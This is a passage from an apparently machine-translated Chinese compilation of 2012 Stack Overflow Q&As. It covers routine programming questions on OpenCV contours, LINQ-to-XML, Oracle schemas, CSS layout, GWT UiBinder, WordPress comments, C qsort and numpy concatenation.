cv2.imshow('img',edges)
cv2.waitKey(0)
cv2.destroyAllWindows() 
```

我认为使用 RETR_TREE 会给我一个很好的轮廓嵌套数组，但似乎并非如此。如何检索轮廓的树结构？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-08-04T10:03:26.410

这里的主要混淆可能是返回的层次结构是一个 numpy 数组，其维度比必要的多。最重要的是，看起来 Python FindContours 函数返回一个元组，它是一个轮廓列表，以及层次结构的 NDARRAY ......

只需采用层次结构[0]，您就可以获得更符合 C 文档的层次结构信息的合理数组。然后，它将是一个合适的形状，例如，与轮廓一起拉链。

下面是一个示例，它将在此图像上以绿色绘制最外面的矩形，以红色绘制最里面的矩形：

![在此处输入图像描述](../Images/549dbc3d218528049b3392c39fcdd89f.png)

输出：

![在此处输入图像描述](../Images/251427c538ed44ec212c6aa227efa954.png)

请注意，顺便说一下，OpenCV 文档中的措辞有点模棱两可，但`hierarchyDataOfAContour[2]`描述了该轮廓的子代（如果它是负数，则它是内轮廓），并`hierarchyDataOfAContour[3]`描述了该轮廓的父代（如果它是负数）那么这是一个外部轮廓）。

另请注意：我研究了您在 OCR 论文中提到的算法，我看到 FindContours 给了我很多重复的几乎相同的轮廓。如论文所述，这将使“边缘盒”的发现变得复杂。这可能是因为 Canny 阈值太低（请注意，我在论文中描述过它们），但可能有一些方法可以减少这种影响，或者只查看所有的四个角的平均偏差框并消除重复...

```
import cv2
import numpy

# Load the image
img = cv2.imread("/ContourTest.PNG")

# Split out each channel
blue, green, red = cv2.split(img)

def medianCanny(img, thresh1, thresh2):
    median = numpy.median(img)
    img = cv2.Canny(img, int(thresh1 * median), int(thresh2 * median))
    return img

# Run canny edge detection on each channel
blue_edges = medianCanny(blue, 0.2, 0.3)
green_edges = medianCanny(green, 0.2, 0.3)
red_edges = medianCanny(red, 0.2, 0.3)

# Join edges back into image
edges = blue_edges | green_edges | red_edges

# Find the contours
contours,hierarchy = cv2.findContours(edges, cv2.RETR_TREE,cv2.CHAIN_APPROX_SIMPLE)

hierarchy = hierarchy[0] # get the actual inner list of hierarchy descriptions

# For each contour, find the bounding rectangle and draw it
for component in zip(contours, hierarchy):
    currentContour = component[0]
    currentHierarchy = component[1]
    x,y,w,h = cv2.boundingRect(currentContour)
    if currentHierarchy[2] < 0:
        # these are the innermost child components
        cv2.rectangle(img,(x,y),(x+w,y+h),(0,0,255),3)
    elif currentHierarchy[3] < 0:
        # these are the outermost parent components
        cv2.rectangle(img,(x,y),(x+w,y+h),(0,255,0),3)

# Finally show the image
cv2.imshow('img',img)
cv2.waitKey(0)
cv2.destroyAllWindows() 
```

# objective-c - 我可以在 iPad 应用程序中加密 TSV 文件吗？

> ID：11782149
> 
> 赞同：0
> 
> 时间：2012-08-02T16:48:38.317
> 
> 标签：objective-c, xcode, encryption

我的 iPad 应用程序当前将用户输入数据保存在 TSV（制表符分隔值）文件中。最后，用户通过电子邮件将此文件发送出去。现在的问题是我必须遵守某些政策，因为信息是敏感的。有没有办法在通过电子邮件发送 TSV 文件之前对其进行加密？

注意：我决定通过电子邮件发送这个 TSV 文件，因为我没有找到其他方法可以将这个文件从 iPad 的沙箱中获取到计算机上。如果有比电子邮件更好的方法，我会很乐意实施（除了使用 iTunes 下载应用程序的沙箱数据，不遵守政策）。

提前感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T18:00:51.513

要加密您的文件，您可以对文本使用任何加密算法，例如[AES](https://stackoverflow.com/questions/1400246/aes-encryption-for-an-nsstring-on-the-iphone)

然后，要将数据发送到您的服务器，您可以使用 Web 服务发布它。[ASIHTTP请求](http://allseeing-i.com/ASIHTTPRequest/)可以为此提供帮助。

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:42:05.147

[Use iFunBox](http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CEMQFjAA&url=http://www.i-funbox.com/&ei=8rsaUO_JMoXY2AXWh4H4Aw&usg=AFQjCNF9USijQCeC-BUxnX0jN34pGFQamw). You can copy files directly from an iOS device. No jailbreak required.

# android - 使用 PHP 和 mySQL 登录 Android

> ID：11782150
> 
> 赞同：0
> 
> 时间：2012-08-02T16:48:39.457
> 
> 标签：android

我正在开发一个 android 应用程序，对于登录部分，在 eclipse 上没有检测到错误，但是没有与 mySQL 数据库建立连接。这是日志文件

```
 08-02 16:25:58.063: I/global(236): Default buffer size used in BufferedReader constructor. It would be better to be explicit if an 8k-char buffer is required.
    08-02 16:25:58.074: W/System.err(236): org.json.JSONException: A JSONObject text must begin with '{' at character 1 of <br />
    08-02 16:25:58.084: W/System.err(236): <b>Parse error</b>:  syntax error, unexpected '{' in <b>C:\Program Files\EasyPHP-12.0\www\Android\Connection.php</b> on line <b>36</b><br />
    08-02 16:25:58.093: W/System.err(236):  at org.json.JSONTokener.syntaxError(JSONTokener.java:448)
    08-02 16:25:58.093: W/System.err(236):  at org.json.JSONObject.<init>(JSONObject.java:178)
    08-02 16:25:58.103: W/System.err(236):  at org.json.JSONObject.<init>(JSONObject.java:246)
    08-02 16:25:58.113: W/System.err(236):  at com.stage.sondage.Login.onClick(Login.java:128)
    08-02 16:25:58.124: W/System.err(236):  at android.view.View.performClick(View.java:2364)
    08-02 16:25:58.124: W/System.err(236):  at android.view.View.onTouchEvent(View.java:4179)
    08-02 16:25:58.124: W/System.err(236):  at android.widget.TextView.onTouchEvent(TextView.java:6540)
    08-02 16:25:58.143: W/System.err(236):  at android.view.View.dispatchTouchEvent(View.java:3709)
    08-02 16:25:58.143: W/System.err(236):  at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:884)
    08-02 16:25:58.153: W/System.err(236):  at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:884)
    08-02 16:25:58.153: W/System.err(236):  at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:884)
    08-02 16:25:58.163: W/System.err(236):  at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:884)
    08-02 16:25:58.163: W/System.err(236):  at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:884)
    08-02 16:25:58.163: W/System.err(236):  at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:884)
    08-02 16:25:58.163: W/System.err(236):  at com.android.internal.policy.impl.PhoneWindow$DecorView.superDispatchTouchEvent(PhoneWindow.java:1659)
    08-02 16:25:58.186: W/System.err(236):  at com.android.internal.policy.impl.PhoneWindow.superDispatchTouchEvent(PhoneWindow.java:1107)
    08-02 16:25:58.203: W/System.err(236):  at android.app.Activity.dispatchTouchEvent(Activity.java:2061)
    08-02 16:25:58.213: W/System.err(236):  at com.android.internal.policy.impl.PhoneWindow$DecorView.dispatchTouchEvent(PhoneWindow.java:1643)
    08-02 16:25:58.213: W/System.err(236):  at android.view.ViewRoot.handleMessage(ViewRoot.java:1691)
    08-02 16:25:58.223: W/System.err(236):  at android.os.Handler.dispatchMessage(Handler.java:99)
    08-02 16:25:58.250: W/System.err(236):  at android.os.Looper.loop(Looper.java:123)
    08-02 16:25:58.253: W/System.err(236):  at android.app.ActivityThread.main(ActivityThread.java:4363)
    08-02 16:25:58.253: W/System.err(236):  at java.lang.reflect.Method.invokeNative(Native Method)
    08-02 16:25:58.253: W/System.err(236):  at java.lang.reflect.Method.invoke(Method.java:521)
    08-02 16:25:58.253: W/System.err(236):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:860)
    08-02 16:25:58.253: W/System.err(236):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:618)
    08-02 16:25:58.253: W/System.err(236):  at dalvik.system.NativeStart.main(Native Method)
    08-02 16:25:58.273: I/NotificationService(60): enqueueToast pkg=com.stage.sondage callback=android.app.ITransientNotification$Stub$Proxy@44e77500 duration=0 
```

我希望很快能听到好的建议。感谢您阅读我的问题。

-阿斯梅

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T18:07:36.833

如果没有看到有问题的代码，很难说没有任何真正的确定性，但错误看起来像是来自页面本身。确保您连接到正确的 url 并为其提供所有参数。它进行 JSON 解析的事实表明它至少连接到该站点。

这个错误

```
<b>Parse error</b>:  syntax error, unexpected '{' in <b>C:\Program Files\EasyPHP-12.0\www\Android\Connection.php</b> on line <b>36</b><br /> 
```

几乎肯定是来自 php 本身。

# c# - 无法构建正确的 linq-to-xml 查询

> ID：11782151
> 
> 赞同：0
> 
> 时间：2012-08-02T16:48:39.927
> 
> 标签：c#, asp.net, xml, linq-to-xml

我是 linq 的新手，我在编写一个查询来拉回我正在寻找的数据时遇到了麻烦。xml 文件有订单，每个订单都有采购订单信息和产品，每个产品都有自己的元素和后代。我需要将所有订单及其后代查询到一个集合中，但由于某种原因，linq 查询语法对我来说非常违反直觉。

这是我的 xml 的截断示例

```
<fulfillment>
   <orders>
      <order>
         <isbulk>true</isbulk> 
         <purchaseorder>
            <id>Acme Inustries</id> 
            <quantity>15</quantity> 
         </purchaseorder>
         <items>
            <item>
               <prods>
                  <prod>
                     <seq>1</seq> 
                     <issuetype>NEW</issuetype> 
                     <loop>
                        <proxy>xyz123</proxy> 
                        <servicecode>55</servicecode> 
                     </loop>
                  </prod>
                  <prod>
                     <seq>2</seq> 
                     <issuetype>NEW</issuetype> 
                     <loop>
                        <proxy>abc987</proxy> 
                        <servicecode>121</servicecode> 
                     </loop>
                  </prod>
               </prods>
            </item>
         </items>
      </order>
      <order>
         <isbulk>true</isbulk> 
         <purchaseorder>
            <id>ABC Co</id> 
            <quantity>10</quantity> 
         </purchaseorder>
         <items>
            <item>
               <prods>
                  <prod>
                     <seq>1</seq> 
                     <issuetype>NEW</issuetype> 
                     <loop>
                        <proxy>xyz456</proxy> 
                        <servicecode>998</servicecode> 
                     </loop>
                  </prod>
                  <prod>
                     <seq>2</seq> 
                     <issuetype>NEW</issuetype> 
                     <loop>
                        <proxy>abc654</proxy> 
                        <servicecode>664</servicecode> 
                     </loop>
                  </prod>
               </prods>
            </item>
         </items>
      </order>
   </orders>
</fulfillment> 
```

我的对象看起来有点像这样：

```
public class order
{
    public bool IsBulk { get; set; }

    public PurchaseOrder PurchaseOrder = new PurchaseOrder();
    public List<prod> ListOfProds = new List<prod>();
}

public class prod
{
    public string Seq { get; set; }
    public string IssueType { get; set; }

    public string Proxy { get; set; }
    public string ServiceCode { get; set; }
}

public class PurchaseOrder
{
    public string ID { get; set; }
    public string Quantity { get; set; }
} 
```

因此，我在一天中的大部分时间都在进行查询，但似乎无法正确处理。这是我到目前为止所得到的：

```
List<order> orderlist = new List<order>();
XDocument xmlDoc = XDocument.Load(FilePath);

var list = (from myOrder in xmlDoc.Descendants("order")             
select new       
{
   linq_orderIsBulk = Convert.ToBoolean(myOrder.Element("isbulk").Value),

   linq_purchaseOrderID = myOrder.Element("purchaseorder").Element("id").Value,
   linq_purchaseOrderQuantity = myOrder.Element("purchaseorder").Element("quantity").Value,

   prodlist = myOrder.Element("items").Element("item").Element("prods").Elements("prod").Select(e => new
   {                
      Linq_seq = e.Element("seq").Value,
      Linq_IssueType = e.Element("issuetype").Value,

      Linq_proxy = e.Element("loop").Element("proxy").Value,
      Linq_serviceCode = e.Element("loop").Element("servicecode").Value
   }).ToList()
}); 
```

//执行代码将列表中的集合放入List orderlist

但是当我这样做时，我似乎最终得到一个“对象引用未设置为对象的实例”。子查询错误。当我注释掉 Linq_proxy 和 Linq_serviceCode 行时，我得到了结果，但不是正确的。当我遍历列表并获取一个订单然后查看该订单的 prodlist 时，计数是该文件的 prods 总数 (4) 而不是该订单的 2 个。有什么想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:11:16.387

我刚刚运行了这个，它工作正常：

```
var orders = new List<order>(
    from myOrder in xmlDoc.Descendants("order")
    let purchaseOrder = myOrder.Element("purchaseorder")
    select new order {
        IsBulk = Convert.ToBoolean(myOrder.Element("isbulk").Value),
        PurchaseOrder = new PurchaseOrder {
            ID = purchaseOrder.Element("id").Value,
            Quantity = purchaseOrder.Element("quantity").Value
        },
        ListOfProds = new List<prod>(
            from product in myOrder.Descendants("prod")
            let loop = product.Element("loop")
            select new prod
            {                
                Seq = product.Element("seq").Value,
                IssueType = product.Element("issuetype").Value,
                Proxy = loop.Element("proxy").Value,
                ServiceCode = loop.Element("servicecode").Value
            }
        )
    }
); 
```

请注意，您可以将集合直接投影到您的类型的对象中，因此您以后不必编写代码来创建订单集合。

# html - 如果我输入一个 rel="nofollow"，推荐网站会出现在 example.com 的 Google Analytics 中吗？

> ID：11782152
> 
> 赞同：5
> 
> 时间：2012-08-02T16:48:43.970
> 
> 标签：html, seo, google-analytics, nofollow

如果我输入一个 rel="nofollow"，推荐网站会出现在 example.com 的 Google Analytics 中吗？

例子：

推荐人网站是：referrer.com

```
<a href="example.com" rel="nofollow"></a> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T16:55:08.597

## 没变

单击链接`rel="nofollow"`仍会将当前页面作为引用者发送。

## 用户浏览不受 rel="nofollow" 的影响

`nofollow`适用于机器人（网站爬虫），谷歌分析跟踪用户（不是机器人）。因此，链接上的 nofollow 对谷歌分析统计数据没有影响——因为它不会修改真实用户的活动。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T16:57:51.983

nofollow 旨在防止机器人进入链接中的站点（或任何链接，如果它位于元标记中）。

即：站点-A 有一个链接：

```
<a rel="nofollow" href="//site-b.com">Site-B</a> 
```

这`nofollow`是为了告诉谷歌它不应该考虑将两个网站链接在一起。或者两页，或者其他什么。

```
<meta name="robots" content="noindex"> 
```

告诉谷歌它不应该在它的搜索中索引*这个*页面。

在您的情况下，您正在寻找一种方法来删除 JavaScript：`document.referrer`从站点 B。您不能在站点 A 中做到这一点。当用户从站点 A 点到站点 B 时，一旦他们在站点 B（安装了 GA）上，站点 A 将无法阻止它。

没有办法做到这一点，没有将用户发送到您自己的服务器，并手动重定向到/从其他地方，使用 apache 或使用其他服务器端解决方案......即使那样，推荐也会来自***某个地方***- 它是只是某个地方的一个例子。

***但是***，如果您谈论的是您拥有的两个站点，***并且您***试图从站点 B 的报告中排除站点 A，则可以在 GA 控制面板中执行此操作。您可以在流量上添加过滤器以排除 IP 或域。

或者，如果您控制 Site-B 上的 GA 跟踪代码，您可以执行以下操作：

```
_gaq.push(["_addIgnoredRef", "Site-A.com"]); 
```

***但是，如果您在为 A 公司工作，并且您不希望 B 公司的人在他们的报告中看到您的网站...*** ...如果没有严格的服务器端，就无法做到这一点头操作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T16:51:45.027

是的，它将显示为推荐人。Nofollow 告诉机器人不要跟随这个链接，并且不会以任何方式影响客户端浏览器的行为。

[http://en.wikipedia.org/wiki/Nofollow](http://en.wikipedia.org/wiki/Nofollow)

# c# - 在查询中将模式名称附加到表名之前是否是多余的？

> ID：11782156
> 
> 赞同：0
> 
> 时间：2012-08-02T16:48:59.973
> 
> 标签：c#, oracle

这两个都在我的应用程序中工作：

```
INSERT INTO PLATYPUS (Bla, Blee, Bloo, Blah) VALUES (:Bla, :Blee, :Bloo, :Blah)

INSERT INTO CRITTERS.PLATYPUS (Bla, Blee, Bloo, Blah) VALUES (:Bla, :Blee, :Bloo, :Blah) 
```

...一种方式优于另一种方式吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T16:51:03.943

如果您使用多个模式，那么不会。这都是关于上下文的。显式优于隐式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-08T06:07:44.073

在研究了许多同时使用隐式和显式（我称之为“硬编码”）模式引用的系统之后，我发现在所有情况下，在应用程序代码中对模式名称进行硬编码会使生活变得更加困难。

这就是 Oracle 有同义词的原因。

我唯一一次硬编码模式名称是在部署脚本中，例如，在创建对象时，我想明确说明应该在哪个模式中创建对象。

这意味着当开发人员问，“我们可以在同一个实例中拥有我们的开发数据库的副本吗？”，我可以说，“没问题 - 给我几分钟”。我创建了一个新模式，将表等复制到其中，然后更新其登录用户的同义词以指向新模式。瞧，一个实例上有两个数据库。但是，如果我让他们在应用程序代码中硬编码模式名称，这将变得不可能，因为没有完成同义词翻译。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-02T16:50:42.123

它们都有效，因为您可能以默认架构为 CRITTERS 的用户身份登录。如果您在默认架构不同时以其他用户身份登录，则必须使用查询的限定形式。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-02T19:43:56.623

任何 Oracle 应用程序中的第一条语句都明确说明您将访问哪些对象：

```
alter session set current_schema = MYSCHEMA; 
```

这样我可以将我的应用程序指向一个数据库服务器（实例）中的不同模式（数据库）。所以永远不要以模式帐户登录。架构帐户应被锁定，并且仅在 ddl 更改（升级）期间打开。

假设我是一名广播员，我运行多个频道：RTL1、RTL2、RTL3、RTL4 等......同一个应用程序可以登录到数据库服务器内的不同数据库（Oracle 术语模式）

现在我为 RTL1 运行我的应用程序：

```
alter session set current_schema = RTL1;
select * from top_stories; 
```

现在我为 RTL2 运行我的应用程序：

```
alter session set current_schema = RTL2;
select * from top_stories; 
```

ETC...

我看到的 #1 设计缺陷是一对一的关系：应用程序 - 数据库服务器。它使管理、存储和备份成为一项全职工作。Oracle 可以在一台数据库服务器上运行数千个应用程序和数据库/模式。

但一如既往，这取决于。有时在一台数据库服务器上运行一个应用程序是有意义的。

所以我尽量不给我的应用程序添加前缀和设计以安装在任何模式中。如果我需要访问其他模式中的对象，我会使用视图和/或同义词。

这种方法效果很好，我知道我通过查询访问了哪些对象：

```
select sys_context('USERENV','CURRENT_SCHEMA') from dual; 
```

# c# - .NET 4 线程、性能改进、并行执行 - 需要

> ID：11782157
> 
> 赞同：-1
> 
> 时间：2012-08-02T16:49:09.053
> 
> 标签：c#, multithreading, .net-4.0

大家好，我正在研究具有几个 dll 的代码的性能改进。我想添加并行执行并提高多个 dll 的性能值被放入一个函数并从线程调用正常处理每行需要 0.1 线程每行需要 1 秒

我想知道我怎么知道为什么线程需要像顺序执行一样的时间？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T16:56:38.013

您需要先分析您的场景，看看它是否受 CPU 限制。如果内存分配过多，i/o、同步、多线程将无济于事。

尝试[http://www.microsoft.com/en-us/download/details.aspx?id=28567](http://www.microsoft.com/en-us/download/details.aspx?id=28567)进行性能分析。

# ios - 对 Ad-hoc Enterprise Distribution 和 Enterprise Developer Program 感到困惑

> ID：11782158
> 
> 赞同：0
> 
> 时间：2012-08-02T16:49:14.813
> 
> 标签：ios, xcode

当使用 Xcode 分发构建时，其中一个选项是“Save for Enterprise or Ad-Hoc Deployment”，如果您选择此选项，那么稍后会出现一个名为“Save for Enterprise Distribution”的复选框。

例如，此处对此进行了描述：[http ://www.readwriteweb.com/mobile/2010/12/apple-best-kept-secret-how-to-do-ad-hoc-installs.php](http://www.readwriteweb.com/mobile/2010/12/apple-best-kept-secret-how-to-do-ad-hoc-installs.php)

但是，此链接和类似链接未提及必须拥有开发者企业计划许可才能使用此功能的任何内容。

这就是我感到困惑的原因-您是否需要拥有企业开发人员计划许可证才能使用“保存以供企业分发”功能来分发测试版本，还是可以与常规开发人员许可证一起使用？

如果您确实需要企业许可证，为什么此链接和其他链接没有提及？如果您不需要许可证，为什么在 Xcode 中将其称为“企业分发”？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T21:40:46.680

尽管这称为“企业分发”，但您无需成为 iOS 企业开发人员计划的一部分即可以这种方式分发 Ad Hoc 构建。

要使用它，只需确保您有一个临时分发配置文件，并且目标设备已添加到团队设备列表并与该配置文件相关联。

# css - 链接样式未在 Safari 中显示

> ID：11782168
> 
> 赞同：1
> 
> 时间：2012-08-02T16:49:58.267
> 
> 标签：css, menu, safari, hyperlink

子菜单链接在我的 macbook 上的 safari 中显示为白色。

它们应该显示为黑色，就像在 Windows 7 上的每个浏览器（即 ff、chrome）中一样。

这发生在我的网站上：[http ://www.impactshred.com](http://www.impactshred.com)

为什么这种风格在 Safari 中不起作用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T16:57:03.217

尝试更新这个：

```
#navigation ul li.hover ul li a,
#navigation ul ul li a,
#navigation ul ul li a:visited 
```

使用`:link`

```
#navigation ul li.hover ul li a:link,
#navigation ul ul li a:link,
#navigation ul ul li a:visited 
```

# gwt - GWT UiBinder: How to make a custom AbsolutePanel which uses the "at" element?

> ID：11782171
> 
> 赞同：4
> 
> 时间：2012-08-02T16:50:06.040
> 
> 标签：gwt, uibinder

Trying to extend AbsolutePanel, my UiBinder won't allow the `<g:at>` element which is normally ok for straight AbsolutePanels. How do I make my AbsolutePanel subclass able to use the `<g:at>` element? And more generally, can I make custom UiBinder keywords for my own custom Widgets like "at", "west", "layer" etc.?

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-02T21:15:26.720

You can use @UiChild to declare special functions in your widgets accessible in UiBinders.

for example,

```
class MyPanel extends AbsolutePanel {

    @UiChild
    public void addAt(Widget w, String parameter1, String parameter2) {
         .... 
```

Then, in your uiBinder, you can say

```
<custom:MyPanel>
    <custom:at parameter1="HI" parameter2="Anything you like!">
        <g:AnySingleWidget />
    </custom:at>
</custom:MyPanel> 
```

See @UiChild at [http://google-web-toolkit.googlecode.com/svn/javadoc/latest/com/google/gwt/uibinder/client/UiChild.html](http://google-web-toolkit.googlecode.com/svn/javadoc/latest/com/google/gwt/uibinder/client/UiChild.html)

# testing - 致命错误后 test.php 页面上的 default.ctp 出现意外内容

> ID：11782172
> 
> 赞同：0
> 
> 时间：2012-08-02T16:50:08.543
> 
> 标签：testing, cakephp-2.1

当我运行一个抛出 PHP 致命错误的测试时，我在输出中看到了我的默认布局 (View/Layouts/default.ctp)，位于 CakePHP 的 test.php 核心布局内。这仅在发生致命错误时发生。更糟糕的是，有关错误的内容被注入到我在 default.ctp 中的一些样式化工件的中间，使其难以阅读。

如果我运行一个测试，尤其是一个不调用控制器的测试，为什么要在我的默认内容布局上调用 render()？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T08:22:34.060

问题标记为“cakephp-2.1”，但您可以使用 2.2 版的 Cake 核心吗？此版本引入了新的`error layout`.
您应该将此文件从：复制`lib/Cake/View/Layouts/error.ctp`到：`app/View/Layouts/`。

检查[迁移指南](http://book.cakephp.org/2.0/en/appendices/2-2-migration-guide.html)。

# arrays - 如何在 C 中创建可排序的字符串-整数对集合？

> ID：11782173
> 
> 赞同：0
> 
> 时间：2012-08-02T16:50:12.203
> 
> 标签：arrays, sorting, sortables

我正在尝试在 C 中创建一个可排序的对象集合。每个对象都由一个唯一的字符串和一个可能不唯一的整数组成，有点像字典或哈希。然而，诀窍是我需要能够按整数部分对集合进行排序。例如，如果集合看起来像这样：

```
a =
    {
    {"string 1", 10},
    {"another string", 4},
    {"yet another string", 74}
    } 
```

`a`升序排序的结果是：

```
 {
    {"another string", 4},
    {"string 1", 10},
    {"yet another string", 74}
    } 
```

或者如果按降序排序会导致：

```
 {
    {"yet another string", 74},
    {"string 1", 10},
    {"another string", 4}
    } 
```

这个想法是，一旦排序，我可以说`get_the_first_sorted_item(a)`或类似的东西，然后是`get_the_next_sorted_item(a)`类似的东西，直到到达集合的结尾。

虽然我认为 Judy 数组会有所帮助，但我现在看到它们有自己的基于“键”而不是“值”的排序方案。

谁能指出我在哪里可以找到这样的解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:12:33.227

[`qsort`](http://www.anyexample.com/programming/c/qsort__sorting_array_of_strings__integers_and_structs.xml)由 ISO C 定义，采用比较函数以允许对结构进行排序，并且应该可以很好地满足您的目的；

```
// The type of the entries.
typedef struct { const char* str; int num; } A;

// A comparison function
int compar(const void* a, const void* b)
{
    return ((A*)a)->num - ((A*)b)->num;
}

...

A a[] = {
  { "string 1", 10 },
  { "another string", 4},
  { "yet another string", 74}
};

// Sort the entries
qsort(a, sizeof(a)/sizeof(A), sizeof(A), compar); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T16:54:38.570

我可能会将元素存储在哈希表中，这样您仍然可以进行名称查找，并且还可以构造一个包含指向哈希元素的指针的优先级队列，这样您就可以快速获取下一个查找。

# css - 垂直对齐由 PHP 脚本生成的重复 DIV，每行两个

> ID：11782175
> 
> 赞同：2
> 
> 时间：2012-08-02T16:50:19.857
> 
> 标签：css, html, css-float, vertical-alignment, repeat

我有一个脚本，它为我网站上的捐赠墙上写的每条消息生成一个 DIV。[你可以在这里](http://soteriabrighton.co.uk/donate/#donorwall)看到捐赠墙。

这是生成 DIV 的脚本部分：

```
foreach( $donors as $donor ):
$output = '<div class="donorbox"><p><strong>'.$donor->name.'</strong> donated '.$donation.'<small class="date time">on '.$datetime.'</small><blockquote class="comment">'.nl2br($donor->comment).'</blockquote></p></div>';
endforeach; 
```

我已将每个施主箱 DIV 的宽度设置为 43.5%，并添加了 float:left，这样 2 始终适合每一行。

由于 DIV 将具有不同的高度，这取决于用户写入消息的时间长短，因此 div 的显示相当不均匀（参见上面链接的页面）。所以我想找到一种将DIV垂直居中的方法，这样每行总是有两个，但这样它们会显示得更均匀，即2个DIV的垂直中心点是对齐的。

当前实现的另一个问题是，当左边一个DIV的高度大于右边那个div的高度时，下一个div停留在页面的右边，而不是被强制到左边，这不是我想要的。如果您查看页面并减小浏览器窗口的宽度，您现在可以看到这一点。第三个供体箱 DIV 位于右侧。

为了希望使我的内容更清晰，我在下面提供了两张图片：

**当前的**

![在此处输入图像描述](../Images/766dfcbf27b90bd47e14a3016d0f2a65.png)

**必需的**

![在此处输入图像描述](../Images/1ecdd4373cf1bc0b18360755d31c8974.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:37:40.453

如果您不确定元素的高度，请始终使用`display: inline-block`而不是`float`. 如果您现在更改它 - 它们将始终正确定位。为了使它们垂直居中 - 只需添加`vertical-align: middle`它们即可:)

Ps 如果您需要 IE7 支持`display: inline-block;`添加`*display: inline; *zoom:1;`;)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:52:31.923

您可以使用以下方法让第二个浮动正确：

```
.yourclass:nth-of-type(2n) {float:right !important;} 
```

# wordpress - have_comments() 返回 false [with comments_template()]

> ID：11782176
> 
> 赞同：3
> 
> 时间：2012-08-02T16:50:21.517
> 
> 标签：wordpress

我的 wordpress 安装行为非常奇怪。首先[最近的帖子停止工作](https://stackoverflow.com/questions/11710067/wp-get-recent-posts-stopped-working)，现在这个......

我正在研究我的自定义 wordpress 主题，但我被困在了评论上。[实际上，我只是从本教程](http://themeshaper.com/2009/07/01/wordpress-theme-comments-template-tutorial/)中复制了评论模板和 3 个函数的代码。

我找到了一个解决方案，说我应该使用 comments_template() 而不是一般的 include 方法调用模板，这就是我的做法。即使 get_comments_number() 返回 2 并且我在仪表板中看到了评论，它仍然没有显示一条评论。

有任何想法吗 ？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T18:06:28.513

5 分钟前我也确实很讨厌这个。

是的，你应该调用这个`comments_template()`函数。

像这样称呼它：

```
comments_template( '', true); 
```

然后`comments.php`在您的主题目录中创建一个，然后执行

```
 if (have_comments()) {
    ...
} 
```

循环。

它应该工作。

# c# - JavaScript CheckBox 无法获取 OnCheckChange 来调用方法

> ID：11782179
> 
> 赞同：0
> 
> 时间：2012-08-02T16:50:44.373
> 
> 标签：c#, javascript, checkbox

所以我有一个复选框，当它的 checkSate 发生更改时，我希望它调用一个方法。

这是我的复选框：

```
<tr><td><input type="checkbox" id="check2" name = "check2" Checked="True" runat="server" OnCheckedChanged="OnCheckedChangedMethod(count);">Sensor 1</input></td></tr> 
```

然后在我的脚本中我有：

```
<script type="text/javascript">
    function OnCheckedChangedMethod(count) {
        document.getElementById('mc_comboView_players').innerHTML = "<h1>" + count + "</h1>";
    }
    /*other functions*/
</script> 
```

我已经通过一个按钮调用了该方法，所以我知道它可以工作，只是没有被调用。

任何想法，我认为我有一些错误的语法，但无法弄清楚。

ps 我先在别处看了

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T16:52:53.700

使用`onchange`而不是`OnCheckedChanged`因为 OnCheckedChanged 不是用于复选框更改的 javascript 事件。

还传递一些可能未定义的`valid`值`OnCheckedChangedMethod``count`

```
<input type="checkbox" id="check2" name = "check2" Checked="True" runat="server" onchange="OnCheckedChangedMethod(7);"> 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-02T17:00:20.587

您也可以使用在复选框更改时触发的JQuery [Change事件。](http://api.jquery.com/change/)在这里您可以找到工作[示例](http://jsfiddle.net/63JnE/)。

# arrays - 仅连接现有的非空 numpy 数组？

> ID：11782182
> 
> 赞同：0
> 
> 时间：2012-08-02T16:50:52.553
> 
> 标签：arrays, numpy, concatenation

这应该很容易...

我想连接数组 A、B 和 C。它们中的一个或多个可能不存在或为空。我希望将剩余的数组连接起来。例如，如果 B 为空，我想将 A 与 C 连接起来。

我已经阅读了这些似乎相关的问题：

[如何检查 numpy 数组是否为空？](https://stackoverflow.com/questions/11295609/how-can-i-check-whether-the-numpy-array-is-empty-or-not)

[如何从 numpy 数组列表中“删除”一个 numpy 数组？](https://stackoverflow.com/questions/3157374/how-do-you-remove-a-numpy-array-from-a-list-of-numpy-arrays)

我假设有一个 1-2 行的方式来做到这一点。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T16:56:46.127

连接空数组不是问题：

```
In [1]: a = np.arange(10)

In [2]: b = np.array([])

In [3]: c = np.arange(3)

In [4]: np.concatenate((a,b,c))
Out[4]: array([ 0.,  1.,  2.,  3.,  4.,  5.,  6.,  7.,  8.,  9.,  0.,  1.,  2.]) 
```

对于二维数组：

```
